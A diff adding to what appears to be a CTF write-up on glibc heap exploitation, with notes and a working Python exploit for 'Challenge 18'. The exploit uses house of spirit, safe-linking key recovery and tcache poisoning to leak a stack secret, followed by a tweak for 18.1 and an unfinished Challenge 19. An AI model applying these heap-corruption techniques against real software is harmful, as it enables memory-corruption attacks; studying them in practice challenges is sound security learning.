@@ -1107,8 +1107,85 @@ def exploit():
 
 ## Challenge 18
 
-Similar to challenge 13, but now there's safe linking. 
+Similar to challenge 13, but now there's safe linking. Moreover, the secret address isn't aligned, hence we cannot allocate a chunk over it. \
+If we would allocate a chunk to the closest aligned address of the secret, we would nullify 8 bytes in the middle of the secret, and point 3 bytes prior to it. Because this memory region contains mostly `0`s, we won't be able to leak the first bytes using `puts`. \
+Therefore, my idea is to use the same approach as challenge 16 - and to leak via the written `next` at the `tcache_perthread_struct`. 
 
+```python
+def exploit():
+    p = process(BINARY)
+    p.recvuntil(b'quit): ')
+    
+    stack_ptr_to_secret_offset = 0xa3
+    # House of spirit - free a fakely-generated chunk on the stack.
+    # Also leak its mangled address
+    chunk_size = 0x80
+    buf = b'A' * 0x30
+    buf += b'B' * 8  # prev_size
+    buf += struct.pack(b'<Q', (chunk_size & 0xf0) + 0x11)  # create fake size
+    malloc(p, 0, chunk_size)
+    stack_scanf(p, buf)
+    stack_free(p)
+    free(p, 0)
+    mangled_stack_ptr = puts(p, 0)
+
+    # In order to obtain the heap key, we have to obtain a leak of the mangled heap pointer
+    chunk_size_2 = chunk_size + 0x10
+    malloc(p, 0, chunk_size_2)
+    malloc(p, 1, chunk_size_2)
+    free(p, 1)
+    free(p, 0)
+    mangled_heap_ptr = puts(p, 0)
+    heap_ptr, heap_key = demangle_ptr(mangled_heap_ptr)  # Adapt this safe-linking to stack values as well
+    heap_base = heap_ptr & 0xfffffffffffff000
+    tcache_perthread_head_bin_0xb0 = heap_base + 0xe0
+    print(f'tcache_perthread_head_bin_0xb0: {hex(tcache_perthread_head_bin_0xb0)} key: {hex(heap_key)}')
+
+    # Decrypt the mangled stack pointer, using the heap key
+    stack_ptr = struct.unpack('<Q', mangled_stack_ptr + b'\x00' * (8 - len(mangled_stack_ptr)))[0] ^ heap_key
+    stack_key = stack_ptr >> 12
+    print(f'stack_ptr: {hex(stack_ptr)} stack_key: {hex(stack_key)}')
+    
+    chunk_size_3 = chunk_size_2 + 0x10
+    new_allocate_chunk_at_addr_in_slot(p, tcache_perthread_head_bin_0xb0, 3, chunk_size_3, heap_key)
+
+    chunk_size_4 = chunk_size_3 + 0x10
+    secret_addr = stack_ptr + stack_ptr_to_secret_offset
+    aligned_secret_addr = secret_addr & 0xfffffffffffffff0
+    print(f'secret_addr: {hex(secret_addr)} aligned_secret_addr: {hex(aligned_secret_addr)}')
+
+    new_allocate_chunk_at_addr_in_slot(p, aligned_secret_addr, 2, chunk_size_4, heap_key)
+    mangled_secret_qword_1 = puts(p, 3)
+    mangled_secret_qword_1 = struct.unpack('<Q', mangled_secret_qword_1 + b'\x00' * (8 - len(mangled_secret_qword_1)))[0]
+    secret_qword_1 = mangled_secret_qword_1 ^ stack_key
+    new_allocate_chunk_at_addr_in_slot(p, aligned_secret_addr + 0x10, 2, chunk_size_4, heap_key)
+    mangled_secret_qword_2 = puts(p, 3)
+    mangled_secret_qword_2 = struct.unpack('<Q', mangled_secret_qword_2 + b'\x00' * (8 - len(mangled_secret_qword_2)))[0]
+    secret_qword_2 = mangled_secret_qword_2 ^ stack_key
+    print(f'q1:{hex(secret_qword_1)} q2:{hex(secret_qword_2)}')
+
+    secret_alignment = stack_ptr_to_secret_offset & 0xf
+    secret = struct.pack('<Q', secret_qword_1)[secret_alignment:]
+    secret += b'\x00' * 8 
+    secret += struct.pack('<Q', secret_qword_2)
+    send_flag(p, secret)
+
+    p.interactive()
+```
+
+## Challenge 18.1
+
+Now the secret was allocated within address ends with nibble of `0xc` instead of `0x3`. This means we would overwrite different parts of the flag, hence these adjustments were made:
+
+```python
+secret = b'\x00' * 4
+secret += struct.pack('<Q', secret_qword_2)
+secret += b'\x00' * 4
+```
+
+## Challenge 19
+
+Now wer'e given with 3 new handlers - `read_flag`, `safe_write`, `safe_read`. The goal is to 
 
 
 
